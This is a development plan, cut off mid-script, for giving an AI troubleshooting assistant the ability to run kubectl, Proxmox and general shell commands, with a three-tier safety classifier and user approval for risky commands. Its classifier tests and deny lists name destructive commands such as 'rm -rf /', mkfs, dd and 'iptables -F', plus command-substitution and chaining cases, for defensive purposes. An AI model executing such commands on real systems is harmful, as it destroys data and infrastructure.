# Agentic Shell Command Execution for TFTSR Application

## Context

The TFTSR (Troubleshooting and RCA Assistant) is an AI-powered desktop application built with Tauri 2 and React that helps with IT incident triage using the 5-Whys methodology. Currently, it guides users through conversations but requires them to manually execute diagnostic commands and paste results back.

**The Goal**: Transform TFTSR into an agentic application where the AI can autonomously execute shell commands (kubectl, Proxmox tools, general diagnostics) with intelligent safety controls, requiring user approval only for potentially dangerous operations.

**Why This Matters**: For the upcoming hackathon (starting next week), this will demonstrate autonomous troubleshooting where the AI can directly inspect Kubernetes clusters, query Proxmox infrastructure, and gather diagnostic data without requiring the user to be a command-line expert.

**Key Constraints**:
- **48-hour hackathon timeline** (2 days)
- **TDD methodology**: Write tests first, then implementation
- **Agentic coding**: Use AI-assisted development for maximum velocity
- Focus on Kubernetes testing (kubectl commands)
- Must support multiple kubeconfig files for different clusters
- kubectl binary cannot be assumed to exist on user's workstation
- Only "safe readonly" commands should auto-execute; everything else requires explicit approval

**Critical Infrastructure Already Built**:
- ✅ Agentic loop exists at `src-tauri/src/commands/ai.rs:304-356` (handles tool calling automatically)
- ✅ Tool execution pipeline with PII detection + audit logging
- ✅ MCP tool integration framework
- ✅ Encrypted credential storage (SQLCipher AES-256)
- ✅ Approval flow patterns (image PII approval)
- ✅ Tauri event emission system

**What's Missing**: The shell execution capability itself, command safety classification, approval modal for dangerous commands, and kubectl binary management.

---

## Implementation Plan (48-Hour TDD Approach)

### Hour 0-2: Setup & Test Infrastructure

**TDD Foundation**:
1. Create test file structure first
2. Write failing tests for all core functionality
3. Set up test fixtures (sample commands, mock kubeconfigs)

**Test Files to Create**:
- `src-tauri/src/shell/tests.rs` - Integration point for all shell tests
- `src-tauri/src/shell/classifier_tests.rs` - Command classification tests
- `src-tauri/src/shell/executor_tests.rs` - Execution flow tests
- `src-tauri/src/shell/kubectl_tests.rs` - kubectl binary location tests

**Initial Failing Tests**:
```rust
// Write these first - they will drive implementation
#[test] fn test_tier1_kubectl_get() { /* will fail */ }
#[test] fn test_tier2_kubectl_delete() { /* will fail */ }
#[test] fn test_tier3_rm_rf() { /* will fail */ }
#[test] fn test_pipe_tier_escalation() { /* will fail */ }
#[test] fn test_command_substitution_detection() { /* will fail */ }
#[test] fn test_locate_kubectl_bundled() { /* will fail */ }
#[test] fn test_locate_kubectl_system_path() { /* will fail */ }
```

Run tests to confirm they fail:
```bash
cargo test --manifest-path src-tauri/Cargo.toml shell::tests
```

### Phase 1: Core Shell Execution Infrastructure (Hours 2-12)

**TDD Cycle**: Red → Green → Refactor for each module

#### 1.1 Create Shell Module Structure

**New Files**:
```
src-tauri/src/shell/
├── mod.rs           (module declarations)
├── classifier.rs    (command safety tier classification)
├── executor.rs      (command execution + approval flow)
├── kubectl.rs       (kubectl binary locator + execution)
└── kubeconfig.rs    (kubeconfig management + encryption)
```

**File: `src-tauri/src/shell/mod.rs`**
```rust
pub mod classifier;
pub mod executor;
pub mod kubectl;
pub mod kubeconfig;

pub use classifier::{CommandClassifier, CommandTier, ClassificationResult};
pub use executor::{execute_with_approval, CommandOutput};
pub use kubectl::{locate_kubectl, execute_kubectl};
pub use kubeconfig::{auto_detect_kubeconfig, KubeconfigInfo};
```

#### 1.2 Command Safety Classifier (TDD)

**Step 1: Write Tests First** (`classifier_tests.rs`)

```rust
#[cfg(test)]
mod classifier_tests {
    use super::*;

    #[test]
    fn test_tier1_kubectl_get() {
        let classifier = CommandClassifier::new();
        let result = classifier.classify("kubectl get pods");
        assert_eq!(result.tier, CommandTier::Tier1);
        assert!(result.components.len() == 1);
    }

    #[test]
    fn test_tier2_kubectl_delete() {
        let classifier = CommandClassifier::new();
        let result = classifier.classify("kubectl delete pod nginx");
        assert_eq!(result.tier, CommandTier::Tier2);
        assert!(result.reasoning.contains("delete"));
    }

    #[test]
    fn test_tier3_rm_rf() {
        let classifier = CommandClassifier::new();
        let result = classifier.classify("rm -rf /");
        assert_eq!(result.tier, CommandTier::Tier3);
    }

    #[test]
    fn test_pipe_safe_to_safe() {
        let classifier = CommandClassifier::new();
        let result = classifier.classify("kubectl get pods | grep nginx");
        assert_eq!(result.tier, CommandTier::Tier1);
        assert_eq!(result.components.len(), 2);
    }

    #[test]
    fn test_pipe_safe_to_danger() {
        let classifier = CommandClassifier::new();
        let result = classifier.classify("kubectl get pods | kubectl delete -f -");
        assert_eq!(result.tier, CommandTier::Tier2);
    }

    #[test]
    fn test_command_substitution() {
        let classifier = CommandClassifier::new();
        let result = classifier.classify("kubectl get $(dangerous)");
        assert_eq!(result.tier, CommandTier::Tier2);
        assert!(result.risk_factors.contains(&"command_substitution".to_string()));
    }

    #[test]
    fn test_proxmox_tier1() {
        let classifier = CommandClassifier::new();
        let result = classifier.classify("pvecm status");
        assert_eq!(result.tier, CommandTier::Tier1);
    }

    #[test]
    fn test_proxmox_tier2() {
        let classifier = CommandClassifier::new();
        let result = classifier.classify("qm migrate 100 node2");
        assert_eq!(result.tier, CommandTier::Tier2);
    }

    #[test]
    fn test_logical_and_operator() {
        let classifier = CommandClassifier::new();
        let result = classifier.classify("ls /tmp && rm -rf /tmp/test");
        assert_eq!(result.tier, CommandTier::Tier3);
    }

    #[test]
    fn test_semicolon_separator() {
        let classifier = CommandClassifier::new();
        let result = classifier.classify("cat file.txt; echo done");
        assert_eq!(result.tier, CommandTier::Tier1);
    }
}
```

**Step 2: Run Tests (Expect Failures)**
```bash
cargo test --manifest-path src-tauri/Cargo.toml classifier_tests
```

**Step 3: Implement Until Tests Pass**

**File: `src-tauri/src/shell/classifier.rs`** (~200 lines)

Implements three-tier classification system:

**Tier 1 (Auto-execute)**: Read-only operations with no side effects
- kubectl: `get`, `describe`, `logs`, `explain`, `api-resources`, `api-versions`, `cluster-info`, `top`, `version`
- Proxmox: `pvecm status`, `pvesh get`, `qm status`, `ceph status`
- General: `cat`, `grep`, `ls`, `find`, `df`, `free`, `ps`, `ss`, `netstat`, `journalctl -xe`, `systemctl status`

**Tier 2 (Prompt user)**: Potentially mutating operations
- kubectl: `apply`, `delete`, `edit`, `scale`, `rollout`, `drain`, `cordon`, `exec`, `cp`, `port-forward`
- Proxmox: `qm migrate`, `pvesh create/set/delete`, `qm start/stop`
- General: `awk`, `sed`, `systemctl restart/reload`, `ssh`, `scp`, `chmod`, `chown`

**Tier 3 (Always deny)**: Destructive operations
- `rm -rf`, `mkfs`, `dd`, `iptables -F`, `passwd`, `shutdown`, `reboot`, `halt`, `poweroff`, `fdisk`, `parted`

**Key Features**:
- Parse piped commands (`|`), logical operators (`&&`, `||`), semicolons (`;`)
- Detect command substitution (`$()`, backticks)
- Extract kubectl subcommands (classify based on `get` vs `delete`, etc.)
- Analyze each component in chains and return highest tier
- Provide detailed reasoning for classification

**Core Structure**:
```rust
pub enum CommandTier {
    Tier1,  // Auto-execute
    Tier2,  // Requires approval
    Tier3,  // Always deny
}

pub struct CommandComponent {
    pub command: String,
    pub subcommand: Option<String>,
    pub args: Vec<String>,
}

pub struct ClassificationResult {
    pub tier: CommandTier,
    pub components: Vec<CommandComponent>,
    pub reasoning: String,
    pub risk_factors: Vec<String>,
}

pub struct CommandClassifier;

impl CommandClassifier {
    pub fn new() -> Self;
    pub fn classify(&self, command: &str) -> ClassificationResult;
    fn classify_single_command(&self, cmd: &str) -> CommandTier;
    fn parse_command_structure(command: &str) -> Vec<CommandComponent>;
    fn contains_command_substitution(command: &str) -> bool;
}
```

**Pattern to Reuse**: Similar to `pii/detector.rs` — regex-based pattern matching with overlap resolution logic.

#### 1.3 Command Executor with Approval Flow

**File: `src-tauri/src/shell/executor.rs`** (~250 lines)

**Core Function**:
```rust
pub async fn execute_with_approval(
    command: &str,
    app_handle: &tauri::AppHandle,
    state: &AppState,
    kubeconfig_id: Option<&str>,
    working_dir: Option<&str>,
) -> Result<CommandOutput, String>
```

**Execution Flow**:
1. Classify command using `CommandClassifier`
2. Match on tier:
   - **Tier 1**: Execute directly
   - **Tier 2**: Emit Tauri event `shell:approval-needed`, wait for user response via channel
   - **Tier 3**: Immediately return error with reasoning
3. For Tier 2 approved commands:
   - Run PII detection on command arguments (reuse `pii/detector.rs`)
   - Write audit log entry (reuse `audit/log.rs` pattern)
   - Execute command with 30-second timeout
   - Record execution in database
4. Return `CommandOutput { exit_code, stdout, stderr, execution_time_ms }`

**Approval Channel Pattern**:
```rust
// Store pending approvals in AppState
pub type ApprovalChannel = tokio::sync::oneshot::Sender<ApprovalResponse>;
pub type PendingApprovals = Arc<TokioMutex<HashMap<String, ApprovalChannel>>>;

async fn wait_for_approval_response(
    approval_id: &str,
    state: &AppState,
) -> Result<ApprovalResponse, String> {
    let (tx, rx) = tokio::sync::oneshot::channel();
    
    // Store channel in state
    {
        let mut pending = state.pending_approvals.lock().await;
        pending.insert(approval_id.to_string(), tx);
    }
    
    // Wait with 60-second timeout
    tokio::time::timeout(std::time::Duration::from_secs(60), rx)
        .await
        .map_err(|_| "Approval request timed out")?
        .map_err(|_| "Approval channel closed")?
}
```

**Pattern to Reuse**: MCP tool execution from `commands/ai.rs:883-952` (PII detection lines 896-907, audit logging lines 910-928).

#### 1.4 kubectl Binary Management (TDD)

**Step 1: Write Tests First** (`kubectl_tests.rs`)

```rust
#[cfg(test)]
mod kubectl_tests {
    use super::*;

    #[test]
    fn test_locate_kubectl_finds_binary() {
        // Should find either bundled or system kubectl
        let result = locate_kubectl();
        assert!(result.is_ok());
        assert!(result.unwrap().exists());
    }

    #[test]
    fn test_kubectl_version_check() {
        let kubectl_path = locate_kubectl().expect("kubectl not found");
        // Should be able to run `kubectl version --client`
        let result = std::process::Command::new(&kubectl_path)
            .arg("version")
            .arg("--client")
            .output();
        assert!(result.is_ok());
    }

    #[tokio::test]
    async fn test_execute_kubectl_with_timeout() {
        let result = execute_kubectl(
            &["get", "nodes"],
            None,
            None,
        ).await;
        // Should either succeed or timeout, not hang forever
        assert!(result.is_ok() || result.is_err());
    }

    #[test]
    fn test_parse_kubectl_command() {
        let (base, subcommand, args) = parse_kubectl_command("kubectl get pods -n default");
        assert_eq!(base, "kubectl");
        assert_eq!(subcommand, Some("get"));
        assert_eq!(args, vec!["pods", "-n", "default"]);
    }
}
```

**Step 2: Run Tests (Expect Failures)**
```bash
cargo test --manifest-path src-tauri/Cargo.toml kubectl_tests
```

**Step 3: Implement Until Tests Pass**

**File: `src-tauri/src/shell/kubectl.rs`** (~150 lines)

**Binary Location Strategy**:
1. Check bundled sidecar binary first (platform-specific)
2. Fallback to system PATH (`which kubectl`)
3. Check common installation paths (`/usr/local/bin`, `/opt/homebrew/bin`, `/usr/bin`)

**Core Functions**:
```rust
pub fn locate_kubectl() -> Result<PathBuf, String>;

pub async fn execute_kubectl(
    args: &[String],
    kubeconfig_path: Option<&str>,
    working_dir: Option<&str>,
) -> Result<CommandOutput, String>;
```

**Environment Isolation**:
- Set `KUBECONFIG` environment variable when provided
- Clear inherited sensitive environment variables
- Set working directory (default to `/tmp` for safety)
- 30-second timeout per command

**Pattern to Reuse**: Similar to `ollama/installer.rs` binary detection logic (lines 23-60).

#### 1.5 Kubeconfig Management

**File: `src-tauri/src/shell/kubeconfig.rs`** (~200 lines)

**Features**:
- Auto-detect `~/.kube/config` at application startup
- Parse YAML to extract contexts and cluster URLs
- Encrypt content using existing `integrations/auth::encrypt_token()` function
- Store in `kubeconfig_files` database table
- Support multiple kubeconfig files with context switching

**Core Functions**:
```rust
pub async fn auto_detect_kubeconfig(state: &AppState) -> Result<(), String>;
pub fn parse_kubeconfig_contexts(content: &str) -> Result<Vec<KubeconfigContext>, String>;
pub async fn get_active_kubeconfig(state: &AppState) -> Result<Option<String>, String>;

pub struct KubeconfigContext {
    pub name: String,
    pub cluster_url: String,
}

pub struct KubeconfigInfo {
    pub id: String,
    pub name: String,
    pub context: String,
    pub cluster_url: Option<String>,
    pub is_active: bool,
}
```

**Pattern to Reuse**: MCP server auth encryption from `mcp/store.rs:274-288`.

---

**Step 4: Verify All Tests Pass**
```bash
cargo test --manifest-path src-tauri/Cargo.toml shell::
```

Expected: All tests green ✅

### Phase 2: Database Schema Extensions (Hours 12-16)

**TDD Approach**: Write integration tests that use the database schema before implementing migrations.

#### 2.1 Add Four New Migrations

**File: `src-tauri/src/db/migrations.rs`**

Add after existing migration 018:

**Migration 019: `shell_commands` table**
```sql
CREATE TABLE IF NOT EXISTS shell_commands (
    id TEXT PRIMARY KEY,
    command_template TEXT NOT NULL,
    tier INTEGER NOT NULL CHECK(tier IN (1, 2, 3)),
    description TEXT,
    category TEXT NOT NULL,  -- 'kubectl', 'proxmox', 'general'
    created_at TEXT NOT NULL DEFAULT (datetime('now'))
);

-- Pre-populate with safe defaults
INSERT INTO shell_commands (id, command_template, tier, description, category) VALUES
('kubectl_get', 'kubectl get', 1, 'Read Kubernetes resources', 'kubectl'),
('kubectl_describe', 'kubectl describe', 1, 'Describe Kubernetes resources', 'kubectl'),
('kubectl_logs', 'kubectl logs', 1, 'View pod logs', 'kubectl'),
('kubectl_apply', 'kubectl apply', 2, 'Apply configuration', 'kubectl'),
('kubectl_delete', 'kubectl delete', 2, 'Delete resources', 'kubectl'),
('pvecm_status', 'pvecm status', 1, 'Check Proxmox cluster status', 'proxmox'),
('qm_status', 'qm status', 1, 'Check VM status', 'proxmox');
```

**Migration 020: `kubeconfig_files` table**
```sql
CREATE TABLE IF NOT EXISTS kubeconfig_files (
    id TEXT PRIMARY KEY,
    name TEXT NOT NULL,
    encrypted_content TEXT NOT NULL,
    context TEXT NOT NULL,
    cluster_url TEXT,
    is_active INTEGER NOT NULL DEFAULT 0,
    uploaded_at TEXT NOT NULL DEFAULT (datetime('now'))
);

CREATE INDEX idx_kubeconfig_active ON kubeconfig_files(is_active);
```

**Migration 021: `command_executions` table**
```sql
CREATE TABLE IF NOT EXISTS command_executions (
    id TEXT PRIMARY KEY,
    issue_id TEXT,
    command TEXT NOT NULL,
    tier INTEGER NOT NULL,
    approval_status TEXT NOT NULL,  -- 'auto', 'approved', 'denied'
    kubeconfig_id TEXT,
    exit_code INTEGER,
    stdout TEXT,
    stderr TEXT,
    execution_time_ms INTEGER,
    executed_at TEXT NOT NULL DEFAULT (datetime('now')),
    FOREIGN KEY (issue_id) REFERENCES issues(id) ON DELETE CASCADE,
    FOREIGN KEY (kubeconfig_id) REFERENCES kubeconfig_files(id) ON DELETE SET NULL
);

CREATE INDEX idx_command_executions_issue ON command_executions(issue_id);
CREATE INDEX idx_command_executions_executed ON command_executions(executed_at);
```

**Migration 022: `approval_decisions` table**
```sql
CREATE TABLE IF NOT EXISTS approval_decisions (
    id TEXT PRIMARY KEY,
    command_pattern TEXT NOT NULL,
    decision TEXT NOT NULL CHECK(decision IN ('allow_once', 'allow_session', 'deny')),
    session_id TEXT,
    decided_at TEXT NOT NULL DEFAULT (datetime('now')),
    expires_at TEXT
);

CREATE INDEX idx_approval_decisions_session ON approval_decisions(session_id);
```

**Pattern to Reuse**: Existing migration pattern from `db/migrations.rs:253-289`.

---

**Database Test First**:
```rust
#[test]
fn test_command_executions_schema() {
    let conn = rusqlite::Connection::open_in_memory().unwrap();
    apply_migrations(&conn).unwrap();
    
    // Verify table exists
    let result: i32 = conn
        .query_row(
            "SELECT COUNT(*) FROM sqlite_master WHERE type='table' AND name='command_executions'",
            [],
            |row| row.get(0)
        )
        .unwrap();
    assert_eq!(result, 1);
    
    // Verify can insert
    conn.execute(
        "INSERT INTO command_executions (id, command, tier, approval_status, exit_code)
         VALUES (?1, ?2, ?3, ?4, ?5)",
        rusqlite::params!["test-id", "kubectl get pods", 1, "auto", 0],
    ).unwrap();
}
```

Run migration, verify test passes.

### Phase 3: Backend Integration (Hours 16-28)

**TDD Cycle**: Write Tauri command tests → Implement commands → Verify

#### 3.1 Update AppState

**File: `src-tauri/src/state.rs`**

Add new field to `AppState` struct (after line 79):
```rust
pub struct AppState {
    pub db: Arc<Mutex<rusqlite::Connection>>,
    pub settings: Arc<Mutex<AppSettings>>,
    pub app_data_dir: PathBuf,
    pub integration_webviews: Arc<Mutex<HashMap<String, String>>>,
    pub mcp_connections: Arc<TokioMutex<HashMap<String, Arc<TokioMutex<McpConnection>>>>>,
    
    // NEW: Channel-based approval system
    pub pending_approvals: Arc<TokioMutex<HashMap<String, tokio::sync::oneshot::Sender<ApprovalResponse>>>>,
}
```

Initialize in `lib.rs` setup:
```rust
pending_approvals: Arc::new(TokioMutex::new(HashMap::new())),
```

#### 3.2 Add Shell Commands Module

**File: `src-tauri/src/commands/shell.rs`** (~300 lines)

Create new Tauri commands:

```rust
#[tauri::command]
pub async fn upload_kubeconfig(
    name: String,
    content: String,
    state: State<'_, AppState>,
) -> Result<String, String>

#[tauri::command]
pub async fn list_kubeconfigs(
    state: State<'_, AppState>,
) -> Result<Vec<KubeconfigInfo>, String>

#[tauri::command]
pub async fn activate_kubeconfig(
    id: String,
    state: State<'_, AppState>,
) -> Result<(), String>

#[tauri::command]
pub async fn delete_kubeconfig(
    id: String,
    state: State<'_, AppState>,
) -> Result<(), String>

#[tauri::command]
pub async fn respond_to_shell_approval(
    approval_id: String,
    decision: String,  // 'deny', 'allow_once', 'allow_session'
    state: State<'_, AppState>,
) -> Result<(), String>

#[tauri::command]
pub async fn list_command_executions(
    issue_id: String,
    state: State<'_, AppState>,
) -> Result<Vec<CommandExecution>, String>

#[tauri::command]
pub async fn check_kubectl_installed(
    state: State<'_, AppState>,
) -> Result<KubectlStatus, String>
```

**Register in `src-tauri/src/commands/mod.rs`**:
```rust
pub mod shell;
```

**Register in `src-tauri/src/lib.rs`** (add to `invoke_handler!()` macro around line 71):
```rust
.invoke_handler(tauri::generate_handler![
    // ... existing commands ...
    commands::shell::upload_kubeconfig,
    commands::shell::list_kubeconfigs,
    commands::shell::activate_kubeconfig,
    commands::shell::delete_kubeconfig,
    commands::shell::respond_to_shell_approval,
    commands::shell::list_command_executions,
    commands::shell::check_kubectl_installed,
])
```

#### 3.3 Register Shell Tool with AI

**File: `src-tauri/src/ai/tools.rs`**

Add new function after `get_add_ado_comment_tool()`:

```rust
pub fn get_available_tools() -> Vec<Tool> {
    vec![
        get_add_ado_comment_tool(),
        get_execute_shell_command_tool(),  // NEW
    ]
}

fn get_execute_shell_command_tool() -> Tool {
    let mut properties = HashMap::new();
    
    properties.insert(
        "command".to_string(),
        ParameterProperty {
            prop_type: "string".to_string(),
            description: "The shell command to execute. Supports kubectl, pvesh, qm, and general shell commands. Can include pipes and chaining.".to_string(),
            enum_values: None,
        },
    );
    
    properties.insert(
        "working_directory".to_string(),
        ParameterProperty {
            prop_type: "string".to_string(),
            description: "Optional working directory. Defaults to /tmp for safety.".to_string(),
            enum_values: None,
        },
    );
    
    properties.insert(
        "kubeconfig_id".to_string(),
        ParameterProperty {
            prop_type: "string".to_string(),
            description: "Optional kubeconfig ID for kubectl commands. Uses active config if not specified.".to_string(),
            enum_values: None,
        },
    );
    
    Tool {
        name: "execute_shell_command".to_string(),
        description: "Execute shell commands with automatic safety classification. Read-only commands (kubectl get, describe, logs) execute automatically. Mutating commands (kubectl apply, delete, scale) require user approval. Supports Kubernetes (kubectl), Proxmox (pvesh, qm), and general diagnostics.".to_string(),
        parameters: ToolParameters {
            param_type: "object".to_string(),
            properties,
            required: vec!["command".to_string()],
        },
    }
}
```

#### 3.4 Route Shell Tool Execution

**File: `src-tauri/src/commands/ai.rs`**

Add new function before `execute_tool_call()`:

```rust
async fn execute_shell_tool_call(
    tool_call: &crate::ai::ToolCall,
    app_handle: &tauri::AppHandle,
    app_state: &State<'_, AppState>,
) -> Result<String, String> {
    // Parse arguments
    let args: serde_json::Value = serde_json::from_str(&tool_call.arguments)
        .map_err(|e| format!("Failed to parse tool arguments: {e}"))?;
    
    let command = args
        .get("command")
        .and_then(|v| v.as_str())
        .ok_or_else(|| "Missing or invalid command parameter".to_string())?;
    
    let working_dir = args.get("working_directory").and_then(|v| v.as_str());
    let kubeconfig_id = args.get("kubeconfig_id").and_then(|v| v.as_str());
    
    // PII detection (reuse existing pattern)
    {
        let detector = crate::pii::detector::PiiDetector::new();
        let spans = detector.detect(command);
        if !spans.is_empty() {
            tracing::warn!(
                tool = %tool_call.name,
                pii_spans = spans.len(),
                "PII detected in shell command arguments"
            );
        }
    }
    
    // Audit log (reuse existing pattern)
    {
        let db = app_state.db.lock().map_err(|e| e.to_string())?;
        let details = serde_json::json!({
            "tool": tool_call.name,
            "command": command,
            "working_dir": working_dir,
            "kubeconfig_id": kubeconfig_id,
        });
        crate::audit::log::write_audit_event(
            &db,
            "shell_tool_call",
            "shell_command",
            command,
            &details.to_string(),
        )
        .map_err(|e| format!("Audit log failed: {e}"))?;
    }
    
    // Execute command with approval flow
    let result = crate::shell::executor::execute_with_approval(
        command,
        app_handle,
        app_state,
        kubeconfig_id,
        working_dir,
    ).await?;
    
    // Record execution in database
    {
        let db = app_state.db.lock().map_err(|e| e.to_string())?;
        db.execute(
            "INSERT INTO command_executions (id, command, tier, approval_status, exit_code, stdout, stderr, execution_time_ms)
             VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8)",
            rusqlite::params![
                uuid::Uuid::now_v7().to_string(),
                command,
                result.tier as i32,
                result.approval_status,
                result.exit_code,
                result.stdout,
                result.stderr,
                result.execution_time_ms,
            ],
        ).map_err(|e| e.to_string())?;
    }
    
    // Format output for AI
    Ok(format!(
        "Command executed successfully.\n\nExit Code: {}\n\nStdout:\n{}\n\nStderr:\n{}",
        result.exit_code,
        result.stdout,
        result.stderr
    ))
}
```

Update `execute_tool_call()` match statement (around line 850):
```rust
async fn execute_tool_call(
    tool_call: &crate::ai::ToolCall,
    app_handle: &tauri::AppHandle,
    app_state: &State<'_, AppState>,
) -> Result<String, String> {
    match tool_call.name.as_str() {
        "add_ado_comment" => { /* existing code */ }
        "execute_shell_command" => {  // NEW
            execute_shell_tool_call(tool_call, app_handle, app_state).await
        }
        name if name.starts_with("mcp_") => execute_mcp_tool_call(tool_call, app_state).await,
        _ => {
            let error = format!("Unknown tool: {}", tool_call.name);
            tracing::warn!("{}", error);
            Err(error)
        }
    }
}
```

#### 3.5 Initialize Kubeconfig on Startup

**File: `src-tauri/src/lib.rs`**

Add kubeconfig auto-detection after MCP discovery (around line 60):

```rust
.setup(|app| {
    // ... existing setup code ...
    
    // Auto-detect kubeconfig
    let state = app.state::<AppState>();
    tauri::async_runtime::spawn(async move {
        if let Err(e) = crate::shell::kubeconfig::auto_detect_kubeconfig(&state).await {
            tracing::warn!("Failed to auto-detect kubeconfig: {}", e);
        } else {
            tracing::info!("Successfully auto-detected kubeconfig");
        }
    });
    
    Ok(())
})
```

---

**Integration Test for Shell Tool**:
```rust
#[tokio::test]
async fn test_execute_shell_tool_call_tier1() {
    let app = setup_test_app();
    let state = app.state::<AppState>();
    
    let tool_call = ToolCall {
        name: "execute_shell_command".to_string(),
        arguments: r#"{"command": "kubectl get pods"}"#.to_string(),
    };
    
    let result = execute_shell_tool_call(&tool_call, &app.handle(), &state).await;
    assert!(result.is_ok());
    assert!(result.unwrap().contains("Exit Code: 0"));
}

#[tokio::test]
async fn test_execute_shell_tool_call_tier2_requires_approval() {
    let app = setup_test_app();
    let state = app.state::<AppState>();
    
    let tool_call = ToolCall {
        name: "execute_shell_command".to_string(),
        arguments: r#"{"command": "kubectl delete pod nginx"}"#.to_string(),
    };
    
    // Should emit approval event and wait
    let result = execute_shell_tool_call(&tool_call, &app.handle(), &state).await;
    // Will timeout or return error if no approval provided
    assert!(result.is_err() && result.unwrap_err().contains("timeout"));
}
```

### Phase 4: Frontend Components (Hours 28-38)

**Component Testing**: Use React Testing Library for component tests before implementation

#### 4.1 Shell Approval Modal

**File: `src/components/ShellApprovalModal.tsx`** (~250 lines)

Create modal component that:
- Listens for `shell:approval-needed` Tauri events
- Displays command with syntax highlighting
- Shows classification tier and reasoning
- Lists detected risk factors
- Provides three action buttons: Deny, Allow Once, Allow for Session
- Calls `respond_to_shell_approval()` Tauri command on decision

**Structure**:
```tsx
interface ShellApprovalRequest {
  approval_id: string;
  command: string;
  tier: number;
  reasoning: string;
  risk_factors: string[];
  components: Array<{
    command: string;
    subcommand?: string;
    args: string[];
  }>;
}

export function ShellApprovalModal() {
  const [request, setRequest] = useState<ShellApprovalRequest | null>(null);
  const [isOpen, setIsOpen] = useState(false);
  
  useEffect(() => {
    const unlisten = listen<ShellApprovalRequest>(
      'shell:approval-needed',
      (event) => {
        setRequest(event.payload);
        setIsOpen(true);
      }
    );
    return () => { unlisten.then(f => f()); };
  }, []);
  
  const handleDecision = async (decision: 'deny' | 'allow_once' | 'allow_session') => {
    if (!request) return;
    await invoke('respond_to_shell_approval', {
      approvalId: request.approval_id,
      decision,
    });
    setIsOpen(false);
    setRequest(null);
  };
  
  // ... render modal UI
}
```

**Pattern to Reuse**: Similar to `ImageGallery.tsx` modal pattern (lines 12-25).

#### 4.2 Kubeconfig Manager

**File: `src/pages/Settings/KubeconfigManager.tsx`** (~300 lines)

Features:
- Upload kubeconfig file via drag-drop or file picker
- Display list of configured clusters with contexts
- Show active cluster (highlighted)
- Activate/deactivate configs
- Delete configs with confirmation
- Display kubectl binary status (installed/bundled/missing)

**Core Functions**:
```tsx
const uploadKubeconfig = async (file: File) => {
  const content = await file.text();
  const id = await invoke<string>('upload_kubeconfig', {
    name: file.name,
    content,
  });
  // Refresh list
};

const activateConfig = async (id: string) => {
  await invoke('activate_kubeconfig', { id });
  // Refresh list
};

const deleteConfig = async (id: string) => {
  if (confirm('Delete this kubeconfig?')) {
    await invoke('delete_kubeconfig', { id });
    // Refresh list
  }
};
```

#### 4.3 Shell Execution Settings

**File: `src/pages/Settings/ShellExecution.tsx`** (~200 lines)

Features:
- Toggle to enable/disable shell execution globally
- Display kubectl binary status and version
- Link to Kubeconfig Manager
- Command execution history viewer (recent executions)
- Tier override settings (future enhancement - can be stubbed)

#### 4.4 Command Execution History

**File: `src/components/CommandHistory.tsx`** (~150 lines)

Display table of recent command executions:
- Command text (truncated)
- Tier badge (T1/T2/T3 color-coded)
- Approval status (auto/approved/denied)
- Exit code with success/failure indicator
- Execution timestamp
- Expandable row to show full stdout/stderr

#### 4.5 Update App Root

**File: `src/App.tsx`**

Add `ShellApprovalModal` at root level (always rendered):

```tsx
import { ShellApprovalModal } from './components/ShellApprovalModal';

function App() {
  return (
    <>
      {/* Existing routes */}
      <ShellApprovalModal />
    </>
  );
}
```

#### 4.6 Update Settings Page

**File: `src/pages/Settings/index.tsx`**

Add new tab for "Shell Execution":

```tsx
<Tab label="Shell Execution">
  <ShellExecution />
</Tab>
```

#### 4.7 Add Tauri Commands to Frontend

**File: `src/lib/tauriCommands.ts`**

Add type-safe wrappers for new commands:

```typescript
export interface KubeconfigInfo {
  id: string;
  name: string;
  context: string;
  cluster_url?: string;
  is_active: boolean;
}

export interface CommandExecution {
  id: string;
  command: string;
  tier: number;
  approval_status: string;
  exit_code?: number;
  stdout?: string;
  stderr?: string;
  execution_time_ms?: number;
  executed_at: string;
}

export async function uploadKubeconfigCmd(
  name: string,
  content: string
): Promise<string> {
  return invoke('upload_kubeconfig', { name, content });
}

export async function listKubeconfigsCmd(): Promise<KubeconfigInfo[]> {
  return invoke('list_kubeconfigs');
}

export async function activateKubeconfigCmd(id: string): Promise<void> {
  return invoke('activate_kubeconfig', { id });
}

export async function deleteKubeconfigCmd(id: string): Promise<void> {
  return invoke('delete_kubeconfig', { id });
}

export async function respondToShellApprovalCmd(
  approvalId: string,
  decision: string
): Promise<void> {
  return invoke('respond_to_shell_approval', { approvalId, decision });
}

export async function listCommandExecutionsCmd(
  issueId: string
): Promise<CommandExecution[]> {
  return invoke('list_command_executions', { issueId });
}

export async function checkKubectlInstalledCmd(): Promise<{
  installed: boolean;
  path?: string;
  version?: string;
}> {
  return invoke('check_kubectl_installed');
}
```

---

**Frontend Test Example**:
```typescript
// src/components/__tests__/ShellApprovalModal.test.tsx
import { render, screen, fireEvent } from '@testing-library/react';
import { ShellApprovalModal } from '../ShellApprovalModal';

describe('ShellApprovalModal', () => {
  it('should not render when no approval needed', () => {
    render(<ShellApprovalModal />);
    expect(screen.queryByText('Shell Command Approval Required')).not.toBeInTheDocument();
  });

  it('should render modal when approval event received', async () => {
    render(<ShellApprovalModal />);
    
    // Simulate Tauri event
    const mockEvent = {
      approval_id: 'test-123',
      command: 'kubectl delete pod nginx',
      tier: 2,
      reasoning: 'Mutating operation',
      risk_factors: [],
      components: [],
    };
    
    // Trigger event
    await mockTauriEvent('shell:approval-needed', mockEvent);
    
    expect(screen.getByText('Shell Command Approval Required')).toBeInTheDocument();
    expect(screen.getByText('kubectl delete pod nginx')).toBeInTheDocument();
  });

  it('should call respond command on deny', async () => {
    // ... test deny button
  });
});
```

Run frontend tests:
```bash
npm run test:run
```

### Phase 5: kubectl Binary Bundling (Hours 38-42)

**Test First**: Verify binary bundling works in development

#### 5.1 Download kubectl Binaries

Create script: `scripts/download-kubectl.sh`

```bash
#!/bin/bash
set -e

KUBECTL_VERSION="v1.30.0"
EXTERNAL_BIN_DIR="src-tauri/externalBin"

mkdir -p "$EXTERNAL_BIN_DIR"

echo "Downloading kubectl $KUBECTL_VERSION binaries..."

# Linux amd64
curl -L -o "$EXTERNAL_BIN_DIR/kubectl-x86_64-unknown-linux-gnu" \
  "https://dl.k8s.io/release/$KUBECTL_VERSION/bin/linux/amd64/kubectl"

# Linux arm64
curl -L -o "$EXTERNAL_BIN_DIR/kubectl-aarch64-unknown-linux-gnu" \
  "https://dl.k8s.io/release/$KUBECTL_VERSION/bin/linux/arm64/kubectl"

# macOS x86_64
curl -L -o "$EXTERNAL_BIN_DIR/kubectl-x86_64-apple-darwin" \
